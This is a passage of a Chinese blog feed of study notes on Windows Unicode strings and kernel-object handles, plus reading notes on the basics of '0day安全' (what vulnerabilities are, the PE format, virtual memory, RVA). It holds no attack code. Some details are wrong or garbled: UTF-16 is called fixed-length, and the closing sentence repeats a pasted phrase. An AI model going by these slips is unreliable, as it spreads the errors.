<td>Unicode只规定了字符的二进制表示方式，并没有指出这些二进制数据如何在计算机中存储（规则）。并且不同国家的语言使用不同的区域，Unicode 只是字符集，UTF-8、UTF-16、UTF-32 才是真正的字符编码规则，常用的编码规则：<br /><strong>UTF-8：</strong>变长编码方式，使用1～4字节来编码不同字符，存储划算，常用于网络传输。<br /><strong>UTF-16：</strong>定长编码，使用2字节或者4字节。编码效率高，Windows、Java使用。<br /><strong>UTF-32：</strong>定长编码，使用4字节，存储非常不划算，更不用说网络传输了。所以这种实现用得极少。</td>
</tr>
</tbody></table>
<p>参考：</p>
<ul>
<li><a href="https://www.21ic.com/article/898541.html">Unicode、UTF-8、UTF-16，终于懂了</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/51202412">Unicode 编码及 UTF-32, UTF-16 和 UTF-8</a></li>
<li><a href="https://www.cnblogs.com/crazylqy/p/10184291.html">彻底弄懂 Unicode 编码</a></li>
</ul>
<h3 id="2-2-ANSI、Unicode字符、字符串数据类型"><a href="#2-2-ANSI、Unicode字符、字符串数据类型" class="headerlink" title="2.2 ANSI、Unicode字符、字符串数据类型"></a>2.2 ANSI、Unicode字符、字符串数据类型</h3><p>C语言的<code>char</code>使用8位的ANSI字符。</p>
<p><code>wchar_t</code>数据类型使用16位（UTF-16）的Unicode。Microsoft的C&#x2F;C++编译器定义了这个内建的数据类型<code>wchar_t</code>。</p>
<p><strong>Unicode编码的数据类型</strong>：</p>
<ul>
<li>数据类型定义在Windows头文件<mark class="label danger">WinNT.h</mark>中；</li>
<li>使用<code>L&#39;&#39;</code>、<code>L&quot;&quot;</code>来表示字符和字符串，如<code>wchar_t wchar = L&#39;A&#39;;</code>；</li>
<li>使用通用字符数据类型<code>TEXT(&#39;&#39;)</code>和<code>TEXT(&quot;&quot;)</code>会在使用ANSI或Unicode的编译器中自动使用<code>char</code>或<code>wchar</code>数据类型。</li>
</ul>
<p>Windows常用数据类型、API、结构体可查看：<a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes"><mark class="label primary">MSDN</mark></a><a href="https://doxygen.reactos.org/d7/d69/typedefs_8h.html"><mark class="label default">ReactOS</mark></a><a href="https://www.rpi.edu/dept/cis/software/g77-mingw32/include/"><mark class="label warning">Win32头文件</mark></a><a href="http://yfvb.com/help/win32sdk/"><mark class="label info">Win32API参考手册</mark></a>等。</p>
<h3 id="2-3-Windows中的ANSI和Unicode函数"><a href="#2-3-Windows中的ANSI和Unicode函数" class="headerlink" title="2.3 Windows中的ANSI和Unicode函数"></a>2.3 Windows中的ANSI和Unicode函数</h3><p><strong>一、A版、W版Win32 API</strong></p>
<p>自Windows NT起，Windows的所有版本都完全用Unicode来构建。</p>
<p>调用Windows函数时，<strong>如果向它传入一个ANSI字符串（由单字节字符组成的一个字符串），那么函数首先会把字符串转换为Unicode</strong>，再把结果传给操作系统。如果希望函数返回ANSI字符串，那么操作系统会先把Unicode字符串转换为ANSI字符串，再把结果返回给我们的应用程序。所有这些转换都是在幕后进行的。</p>
<p>如果一个Windows函数的多数列表中有字符串，则该函数通常有两个版本，<mark class="label danger">A</mark>版、<mark class="label danger">W</mark>版。如：</p>
<ul>
<li><code>CreateWindowExA</code>：接受ANSI字符串；</li>
<li><code>CreateWindowExW</code>：接受Unicode字符串。</li>
</ul>
<div class="note primary"><p><strong>备注：</strong>使用时只需要用宏<code>CreateWindowEx</code>即可，因为编译器会自动使用<strong>A</strong>版或<strong>W</strong>版。这些类似的宏在<mark class="label danger">WinUser.h</mark>中定义。</p>
<p>ANSI版本只是分配内存，执行必要的字符串转换，然后调用该函数的Unicode版本与操作系统打交道。</p>
</div>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CreateWindowEx  CreateWindowExW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CreateWindowEx  CreateWindowExA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure>



<p><strong>二、尽量使用新函数</strong></p>
<p>Windows API中的一些函数如：</p>
<p><code>WinExec</code>和<code>OpenFile</code>存在的唯一目的就是为了向后兼容16位Windows程序，因为后者只支持ANSI字符串。在开发的新程序中，应避免使用这些函数。应该用<code>CreateProcess</code>和<code>CreateFile</code>函数调用来代替。</p>
<p>在内部，老函数总是会调用新函数。但老函数的最大问题在于，它们不接受Unicode字符串，而且支持的功能一般都要少一些。调用这些函数的时候，必须向其传递ANSI字符串。</p>
<h3 id="2-4-C运行库中的ANSI和Unicode函数"><a href="#2-4-C运行库中的ANSI和Unicode函数" class="headerlink" title="2.4 C运行库中的ANSI和Unicode函数"></a>2.4 C运行库中的ANSI和Unicode函数</h3><p>和Windows函数一样，C运行库提供了一系列函数来处理ANSI字符和字符串，并提供了另一系列函数来处理Unicode字符与字符串。然而，与Windows不同的是，<mark class="label info">ANSI版本的函数是不会把字符串转换为Unicode形式，再从内部调用函数的Unicode版本</mark>。当然，Unicode版本的函数也是“自力更生”的，它们不会在内部调用ANSI版本。</p>
<p>字符（串）处理函数举例（使用时应该包含<mark class="label danger">TChar.h</mark>头文件）：</p>
<p>ANSI：<code>strlen</code></p>
<p>Unicode：<code>wcslen</code></p>
<p>通用版：<code>_tcslen</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _UNICODE </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _tcslen wcslen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">#define_tcslen strlen</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<div class="note danger"><p>备注：有<code>_t</code>一般都是都用版本的宏，如<code>_tmain</code>。</p>
</div>

<h3 id="2-5-C运行库中的安全字符串函数"><a href="#2-5-C运行库中的安全字符串函数" class="headerlink" title="2.5 C运行库中的安全字符串函数"></a>2.5 C运行库中的安全字符串函数</h3><p>许多字符串处理函数默认以<code>\0</code>作为一个字符串的结束符，或者没有考虑缓冲区与处理字符串长度而导致缓冲区溢出。</p>
<p>所以建议使用安全函数，这些函数仅在原函数后面加了<code>_s</code>（代表Secure）后缀，在<mark class="label danger">StrSafe.h</mark>头文件中定义，使用该头文件时应该安全SDK才可以使用。</p>
<p>安全函数解析举例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PTSTR _tcscpy(PTSTR strDestination, PCTSTR strSource);</span><br><span class="line"><span class="keyword">errno_t</span> _tcscpy_s(PTSTR strDestination, <span class="keyword">size_t</span> numberOfcharacters, PCTSTR strSource);</span><br><span class="line"></span><br><span class="line">PTSTR _tcscat(PTSTR strDestination, PCTSTR strSource);</span><br><span class="line"><span class="keyword">errno_t</span> _tcscat_s(PTSTR strDestination, <span class="keyword">size_t</span> numberOfcharactere, PCTSTR strSource);</span><br></pre></td></tr></table></figure>

<p>安全解决方法：<mark class="label success">在将一个可写的缓冲区作为参数传递时，必须同时提供它的大小</mark>。</p>
<div class="note default"><p>关于<code>_countof</code>和<code>sizeof</code>：</p>
<ul>
<li><code>_countof</code>：Windows宏，用来计算一个静态分配的数组中的元素的个数。</li>
<li><code>sizeof</code>：运算符（不是函数），用来计算<strong>字节数</strong>。</li>
</ul>
<p>如使用宽字符的程序，一个字符占2字节，假设一个使用4个字符的字符串，<code>_countof</code>结果为4，<code>sizeof</code>结果为8。</p>
</div>

<p>MSDN中的许多Win32 API函数不指定参数使用<code>in bytes</code>（以字节为单位）时，默认使用<code>in TCHAR</code>（以字符为单位）。</p>
<p>还有些API函数名称就已经指定使用字符还是字节：</p>
<ul>
<li><code>StringCchCpy()</code>、<code>StringCchPrintf()</code>…：都含有<code>Cch</code>（Count of characters）使用字符数，则使用<code>_countof</code>；</li>
<li><code>StringCbCat(Ex)</code>、<code>StringCbCopy(Ex)</code>…：都含有<code>Cb</code>（Count of bytes）使用字节数，则使用<code>sizeof</code>。</li>
</ul>
<div class="note danger"><p>注意C运行库中的Ex函数会比其常规函数多三个参数（更安全，更详细），具体参见2.5.2最后，该<code>EX</code>应区别于Win32 API的<code>EX</code>。</p>
</div>



<h3 id="2-6-Windows字符串函数"><a href="#2-6-Windows字符串函数" class="headerlink" title="2.6 Windows字符串函数"></a>2.6 Windows字符串函数</h3><p>Windows中的许多字符串函数是不安全的，如<code>lstrcat</code>、<code>lstrcpy</code>等（Kernel32方法）。所以在<mark class="label danger">ShlwApi.h</mark>定义了大量字符串处理函数，以更安全的方式来使用。</p>
<div class="note info"><p><strong>Shlwapi</strong>是Windows的Shell API函数。主要分为三类函数，每一类函数都要区分A版和W版。：</p>
<ul>
<li>第一类是字符串处理函数，通常以<code>Str</code>开头；</li>
<li>第二类是路径或者文件夹处理函数，通常以<code>Path</code>开头；</li>
<li>第三类是注册表处理函数，通常以<code>SH</code>开头。</li>
</ul>
</div>

<p><strong>Unicode与ANSI字符串互相转换：</strong>使用函数<a href="https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-multibytetowidechar">MultiByteToWideChar</a>与<a href="https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte">WideCharToMultiByte</a>）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MultiByteToWideChar</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            UINT                              CodePage,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            DWORD                             dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            _In_NLS_string_(cbMultiByte)LPCCH lpMultiByteStr,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            <span class="keyword">int</span>                               cbMultiByte,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional] LPWSTR                            lpWideCharStr,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            <span class="keyword">int</span>                               cchWideChar</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">WideCharToMultiByte</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            UINT                               CodePage,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            DWORD                              dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            <span class="keyword">int</span>                                cchWideChar,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional] LPSTR                              lpMultiByteStr,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            <span class="keyword">int</span>                                cbMultiByte,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional]  LPCCH                              lpDefaultChar,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional] LPBOOL                             lpUsedDefaultChar</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>应特别注意：</p>
<ul>
<li><code>cchWideChar</code>单位是：字符；</li>
<li><code>cbMultiByte</code>单位是：字节。</li>
</ul>
<p><strong>判断文本是ANSI还是Unicode：</strong>使用函数<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-istextunicode">IsTextUnicode</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">IsTextUnicode</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                <span class="keyword">const</span> VOID *lpv,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                <span class="keyword">int</span>        iSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, out, optional] LPINT      lpiResult</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="3-内核对象"><a href="#3-内核对象" class="headerlink" title="3 内核对象"></a>3 内核对象</h2><p>各种对象的区分：</p>
<div class="note success"><ul>
<li><mark class="label danger">HINSTANCE</mark>：<a href="https://www.cnblogs.com/autopwn/p/15493308.html">HINSTANCE是个数据类型</a>，本质就是个结构体指针，里面结构体成员只有一个int类型变量，指向的是PE结构中讲到的ImageBase，仅此而已；</li>
<li><mark class="label danger">HMODULE</mark>：事实上，HMODULE和HINSTANCE完全是一回事。如果某个函数的文档指出需要一个HMODULE参数，我们可以传入一个HINSTANCE，反之亦然。之所以有两种数据类型，是由于在16位Windows中，HMODULE和HINSTANCE表示不同类型的数据。《Windows核心编程第五版-4.1.1进程实例句柄》</li>
<li><mark class="label danger">HWND</mark>：也是个结构体类型指针，里面定义的类型同样是int类型，只是她这个结构体指针指向的是Windows给其分配的一个唯一的ID而已；HWND同样是个数据类型，只是改了名称叫法而已，叫做窗口句柄，将其实例化后，就是个整型int类型的数据，只是是用指针的方式指向她，其本质是个结构体指针，里面结构体成员只有一个int类型变量，所以HWND是个带有int类型成员的结构体指针，指向每个不同的窗口，并且给不同的窗口分配唯一的编号，通过这个编号就能找到不同的窗口，仅此而已；</li>
<li>内核句柄<mark class="label danger">HANDLE</mark>：系统用索引来表示内核对象的信息保存在进程句柄表中的具体位置，要得到实际的索引值，句柄值实际应该除以4（或右移两位，以忽略Windows操作系统内部使用的最后两位）。所以，在调试应用程序时查看内核对象句柄的实际值时，会看到4、8之类的很小的值。记住，句柄的含义尚未公开，将来可能发生变化</li>
</ul>
</div>

<h3 id="3-1-内核对象是什么"><a href="#3-1-内核对象是什么" class="headerlink" title="3.1 内核对象是什么"></a>3.1 内核对象是什么</h3><div class="note danger"><p>每个内核对象都只是一个内存块，它由操作系统内核分配，并只能由操作系统内核访问。这个内存块是一个数据结构，其成员维护着与对象相关的信息。</p>
<p><mark class="label warning">每个内核对象都是一个数据结构</mark>。该结构少数成员（安全描述符和使用计数等）是所有对象都有的，但其他大多数成员都是不同类型的对象特有的。<strong>该数据结构只能由操作系统访问，应用程序无法访问</strong>。</p>
</div>

<p>例如：</p>
<ul>
<li>进程对象有一个进程ID、一个基本的优先级和一个退出代码；</li>
<li>文件对象有一个字节偏移量（byte offset）、一个共享模式和一个打开模式。</li>
</ul>
<div class="note danger"><p>创建一个内核对象，会返回一个句柄。32位的进程中，句柄值为32位；64位进程中句柄值为64位。</p>
<p>句柄值仅用于当前进程，其他进程不可用，因为不同进程中句柄值都是从1*4开始的。</p>
</div>

<h3 id="3-2-内核对象成员-使用计数"><a href="#3-2-内核对象成员-使用计数" class="headerlink" title="3.2 内核对象成员-使用计数"></a>3.2 内核对象成员-使用计数</h3><p>进程终止运行，内核对象并不一定会销毁。大多数情况下，这个内核对象是会销毁的，但假如另一个进程正在使用我们的进程创建的内核对象，那么在其他进程停止使用它之前，它是不会销毁的。<strong>总之，内核对象的生命期可能长于创建它的那个进程。</strong></p>
<p><strong>原因</strong>：内核对象的所有者是操作系统内核，而非进程。</p>
<div class="note info"><p>操作系统内核知道当前有多少个进程正在使用一个特定的内核对象，因为每个对象都包含一个使用计数（usage count）。<mark class="label primary">使用计数是所有内核对象类型都有的一个数据成员</mark>。初次创建一个对象的时候，其使用计数被设为1。另一个进程获得对现有内核对象的<strong>访问后</strong>，使用计数就会递增。进程终止运行后，操作系统内核将自动递减此进程仍然打开的所有内核对象的使用计数。如果一旦对象的使用计数变成0，操作系统内核就会销毁该对象。这样一来，可以保证系统中不存在没有被任何进程引用的内核对象。</p>
</div>

<h3 id="3-3-内核对象成员-安全属性"><a href="#3-3-内核对象成员-安全属性" class="headerlink" title="3.3 内核对象成员-安全属性"></a>3.3 内核对象成员-安全属性</h3><p>内核对象可以用一个安全描述符（security descriptor, SD）来保护。</p>
<div class="note danger"><p>用于创建内核对象的所有函数几乎都有指向一个<a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)">SECURITY_ATTRIBUTES</a>结构的指针<mark class="label danger">PSECURITY_ATTRIBUTES</mark>作为参数。</p>
</div>

<p>如下创建进程函数的第三、四参数就是描述进程、线程安全属性的：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="function"><span class="params">  __inout_opt  LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in         BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in         DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in         LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">  __out        LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>安全属性结构定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_ATTRIBUTES</span> &#123;</span></span><br><span class="line">  DWORD  nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL   bInheritHandle;</span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>nLength</code>：结构的字节大小，<code>sizeof(SECURITY_ATTRIBUTE)</code>；</li>
<li><code>lpSecurityDescriptor</code>：安全访问属性，指向一个<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-security_descriptor?redirectedfrom=MSDN">安全描述符结构</a>；</li>
<li><code>bInheritHandle</code>：控制内核对象句柄是否可被继承，<code>TRUE</code>或<code>FALSE</code>。</li>
</ul>
<p><strong>如果利用句柄来调用API函数，API往往是需要获得一定权限才可以访问的</strong>。如<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a>函数的第一个参数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] BOOL  bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="3-4-进程内核对象句柄表"><a href="#3-4-进程内核对象句柄表" class="headerlink" title="3.4 进程内核对象句柄表"></a>3.4 进程内核对象句柄表</h3><p>个进程在初始化时，系统将为它分配一个句柄表（handle table）。<strong>一个进程刚创建（初始化）时，其句柄表时空的</strong>。</p>
<p>每在该进程中创建一个内核对象，就会在该进程的内核对象句柄表中填充一项句柄表记录。</p>
<p>用于创建内核对象的任何函数都会返回一个与进程相关的句柄，这个句柄可由同一个进程中运行的额所有线程使用。</p>
<p><img data-src="https://i.loli.net/2021/11/08/RDKUTtOVds4i5wg.png" alt="3.png"></p>
<div class="note default"><p>句柄值和句柄表索引值的对应关系：<mark class="label danger">句柄值 &#x3D; 索引值*4</mark></p>
</div>

<p><strong>凡是用于创建内核对象的函数，都要仔细检查它的返回值，比如失败：有的返回0（<code>NULL</code>），有的返回（-1）<code>INVALID_HANDLE_VALUE</code>。</strong></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>Windows内核</tag>
      </tags>
  </entry>
  <entry>
    <title>0day安全：软件漏洞分析技术（第二版）读书笔记（1-2）</title>
    <url>/post/0day2-1-2/</url>
    <content><![CDATA[<p>漏洞利用技术才是实施有效攻击的最核心技术，才是突破安全边界、实施深度入侵的关键所在。ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭<br><a href="#zl"><mark class="label default">PUSH</mark><mark class="label warning">POP</mark><mark class="label danger">CALL</mark><mark class="label success">RET</mark></a><a href="#sj"><mark class="label danger">内存数据</mark><mark class="label primary">数值数据</mark><mark class="label default">小端序</mark></a></p>
<span id="more"></span>

<h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a>第一章 基础知识</h2><p>我们通常把能够引起软件做一些“超出设计范围的事情”的bug 称为漏洞（vulnerability）。</p>
<ol>
<li><mark class="label success">功能性逻辑缺陷（bug）</mark>：影响软件的正常功能，例如，执行结果错误、图标显示错误等。</li>
<li><mark class="label warning">安全性逻辑缺陷（漏洞）</mark>：通常情况下不影响软件的正常功能，但被攻击者成功利用后，有可能引起软件去执行额外的恶意代码。常见的漏洞包括软件中的缓冲区溢出漏洞、网站中的跨站脚本漏洞（XSS）、 SQL注入漏洞等。</li>
</ol>
<h3 id="1-1-漏洞挖掘、漏洞分析、漏洞利用"><a href="#1-1-漏洞挖掘、漏洞分析、漏洞利用" class="headerlink" title="1.1 漏洞挖掘、漏洞分析、漏洞利用"></a>1.1 漏洞挖掘、漏洞分析、漏洞利用</h3><p>利用漏洞进行攻击可以大致分为漏洞挖掘、漏洞分析、漏洞利用三个步骤。这三部分所用的技术有相同之处，比如都需要精通系统底层知识逆向工程等：同时也有一定的差异。</p>
<h4 id="1-1-1-漏洞挖掘"><a href="#1-1-1-漏洞挖掘" class="headerlink" title="1.1.1 漏洞挖掘"></a>1.1.1 漏洞挖掘</h4><p>由于安全性漏洞往往有极高的利用价值，例如，导致计算机被非法远程控制，数据库数据泄漏等，所以总是有无数技术精湛、精力旺盛的家伙在夜以继日地寻找软件中的这类<strong>逻辑瑕疵</strong>。他们精通二进制、汇编语言、操作系统底层的知识;他们往往也是杰出的程序员，因此能够敏锐地捕捉到程序员所犯的细小错误。</p>
<p>寻找漏洞的人并非全是攻击者。大型的软件企业也会雇用一些安全专家来测试自己产品中的漏洞，这种测试工作被称做 Penetrationtest（攻击测试），这些测试团队则被称做 Tigerteam 或者 Ethic hacker。</p>
<p><strong>从技术角度讲</strong>，漏洞挖掘实际上是一种高级的测试 （QA）。 <strong>学术界</strong>一直热衷于使用静态分析的方法寻找源代码中的漏洞；而<strong>在工程界</strong>，不管是安全专家还是攻击者，普遍采用的漏洞挖掘方法是<code>Fuzz</code>，这实际是一种<mark class="label default">“灰”盒测试</mark>。</p>
<h4 id="1-1-2-漏洞分析"><a href="#1-1-2-漏洞分析" class="headerlink" title="1.1.2 漏洞分析"></a>1.1.2 漏洞分析</h4><p> ①在分析漏洞时，<strong>如果能够搜索到POC (proof of concept）代码，就能重现漏洞被触发的现场</strong>。这时可以使用调试器观察漏洞的细节，或者利用一此工具(如Paimei)更方便地找到漏洞的触发点。</p>
<p>当无法获得 POC 时，就只有厂商提供的对漏洞的简单描述了。</p>
<p>②一个比较通用的办法是使用<mark class="label danger">补丁比较器</mark>，首先比较<code>patch</code>前后可执行文件都有哪些地方被修改，之后可以利用反汇编T 具（如IDA Pro）重点逆向分析这些地方。</p>
<p>漏洞分析需要扎实的逆向基础和调试技术，除此以外还要精通各种场景下的漏洞利用方法。这种技术更多依靠的是经验，很难总结出通用的条款。</p>
<h4 id="1-1-3-漏洞利用"><a href="#1-1-3-漏洞利用" class="headerlink" title="1.1.3 漏洞利用"></a>1.1.3 漏洞利用</h4><p>手机安全及 Web 应用中的脚本注入攻击所使用的技术与 Windows 平台下缓冲区溢出相差较大，且自成体系。</p>
<h3 id="1-2-二进制文件概述"><a href="#1-2-二进制文件概述" class="headerlink" title="1.2 二进制文件概述"></a>1.2 二进制文件概述</h3><h4 id="1-2-1-PE文件格式"><a href="#1-2-1-PE文件格式" class="headerlink" title="1.2.1 PE文件格式"></a>1.2.1 PE文件格式</h4><p>PE (Portable Exec utable）是 Win32 平台下可执行文件遵守的数据格式。常见的可执行文 件（如<code>*.exe</code>文件和<code>*.II</code> 文件）都是典型的 PE 文件。</p>
<p>一个可执行文件不光包含了二进制的机器代码，还会自带许多其他信息，如字符串、菜单、图标、位图、字体等。<mark class="label default">PE 文件格式规定了所有的这些信息在可执行文件中如何组织。</mark><mark class="label danger">PE 在程序被执行时，操作系统会按照 PE 文件格式的约定去相应的地方准确地定位各种类型的资源，并分别装入内存的不同区域。</mark></p>
<p><img data-src="https://i.loli.net/2021/04/26/auvn3ArkYHq6JPS.png" alt="1-1.png"></p>
<h4 id="1-2-2-虚拟内存"><a href="#1-2-2-虚拟内存" class="headerlink" title="1.2.2 虚拟内存"></a>1.2.2 虚拟内存</h4><p><img data-src="https://i.loli.net/2021/04/26/wGorxUhYq8JXFLS.png" alt="1-2.png"></p>
<p>进程所拥有的 4GB 虚拟内存中包含了程序运行时所必需的资源，比如代码、栈空间、堆空间、资源区、动态链接库等。在后面的章节中，我们将不停地辗转于虚拟内存中的这些区域。</p>
<div class="note success"><p><mark class="label danger">注意</mark>：操作系统原理中也有“虚拟内存”的概念，那是指当实际的物理内存不够时，有时操作系统会把“部分硬盘空间”当做内存使用从而使程序得到装载运行的现象。请不要将用硬盘充当内存的“虚拟内存”与这里介绍的“虚拟内存”相混淆。此外，本书除第4篇内核安全外，其余所述之“内存”均指 Windows 用户态内存映射机制下的虚拟内存。</p>
</div>

<div class="note warning"><p><mark class="label warning">关于用户态模式下的虚拟内存</mark></p>
<p>由下图可以看出，进程的虚拟地址空间，<mark class="label default">由多个虚拟内存区域构成</mark>。虚拟内存区域是进程的虚拟地址空间中的一个同质区间，即具有同样特性的连续地址范围。上图中所示的text数据段（代码段）、初始数据段、BSS数据段、堆、栈和内存映射，都是一个独立的虚拟内存区域。而为内存映射服务的地址空间处在堆栈之间的空余部分。</p>
</div>

<p><img data-src="https://i.loli.net/2021/04/26/m3jRz2hdkXUc4Fv.jpg" alt="1-3.jpeg"></p>
<p><a href="https://blog.csdn.net/qq_22418329/article/details/108861642">用户态进程的虚拟地址如何转换成物理地址</a>、<a href="https://blog.csdn.net/weixin_42462202/article/details/102490633">Linux内存管理（四）用户态内存映射</a></p>
<h4 id="1-2-3-PE文件与虚拟内存之间的映射"><a href="#1-2-3-PE文件与虚拟内存之间的映射" class="headerlink" title="1.2.3 PE文件与虚拟内存之间的映射"></a>1.2.3 PE文件与虚拟内存之间的映射</h4><p>在调试漏洞时，可能经常需要做这样两种操作。</p>
<ol>
<li><strong>静态反汇编工具</strong>看到的 PE 文件中某条指令的位置是相对于磁盘文件而言的，即所谓的<mark class="label primary">文件偏移</mark>。我们可能还需要知道这条指令在内存中所处的位置，即<mark class="label info">虚拟内存地址</mark>（VA）。</li>
<li>反之，在<strong>动态调试</strong>时看到的某条指令的地址是虚拟内存地址，我们也经常需要回到 PE 文件中找到这条指令对应的机器码。</li>
</ol>
<div class="note danger"><ol>
<li><p>文件偏移地址（File Offset）</p>
<p>数据在 PE 文件中的地址叫文件偏移地址（文件地址）。这是文件在磁盘上存放时相<strong>对于文件开头</strong>的偏移。</p>
</li>
<li><p>装载基址(Image Base ） </p>
<p>PE 装入内存时的基地址。默认情况下，EXE 文件在内存中的基地址是<mark class="label default">0x00400000</mark>，DL L文件是<mark class="label warning">0x10000000</mark>，这些位置可以通过修改编译选项更改。</p>
</li>
<li><p>虚拟内存地址（Virtual Address, VA）</p>
<p>PE 文件中的指令被装入内存后的地址。</p>
</li>
<li><p>相对虚拟地址（Relative Virtual Address, RVA）</p>
</li>
<li><p>相对虚拟地址是内存地址相对于映射基址的偏移量。</p>
</li>
</ol>
<p>虚拟内存地址、映射基址、相对虚拟内存地址三者之间有如下关系。</p>
<p>$$VA&#x3D;Image Base + RVA$$</p>
<p>文件偏移是相对于文件开始处<mark class="label success">0字节</mark>的偏移，RVA（想对虚拟地址）则是相对于<mark class="label success">装载基址</mark><code>0x00400000</code>处的偏移。</p>
</div>

<p><img data-src="https://i.loli.net/2021/04/26/OrpcbXVY72LINu1.png" alt="1-4.png"></p>
<p>由于操作系统在进行装载时“基本”上保持 PE 中的各种数据结构，所以文件偏移地址和RVA有很大的一致性。之所以说“基本”上一致是因为还有一些细微的差异。这些差异是由于文件数据的存放单位与内存数据存放单位不同而造成的。</p>
<div class="note default"><ol>
<li>PE 文件中的数据按照磁盘数据标准存放，以<code>0x200</code>字节为基本单位进行组织。当一个数据节（section） 不足<code>0x200</code>字节时，<mark class="label danger">不足的地方将被 0x00 填充</mark>；当一个数据节超过<code>0x200</code>字节时，下一个<code>0x200</code>块将分配给这个节使用。因此 PE 数据节的大小永远是<code>0x200</code>的整数倍。</li>
<li>当代码装入内存后，将按照内存数据标准存放，并以<code>0x1000</code>字节为基本单位进行组织。类似的，不足将被补全，若超出将分配下一个<code>0x1000</code>为其所用。因此，内存中的节总是<code>0x1000</code>的整数倍。</li>
</ol>
</div>

<p>这种由存储单位差异引起的节基址差称为<mark class="label danger">不足的地方将被 0x00 填充</mark>节偏移。</p>
